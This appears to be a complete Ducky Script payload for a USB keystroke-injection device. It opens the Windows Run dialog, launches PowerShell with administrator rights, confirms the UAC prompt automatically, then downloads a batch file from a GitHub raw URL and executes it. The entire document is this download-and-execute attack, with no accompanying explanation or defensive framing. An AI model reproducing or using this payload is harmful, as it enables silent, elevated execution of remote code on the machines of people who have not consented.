DELAY 1000
GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 200
STRING $down = New-Object System.Net.WebClient; $url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'; $file = 'lel.bat'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
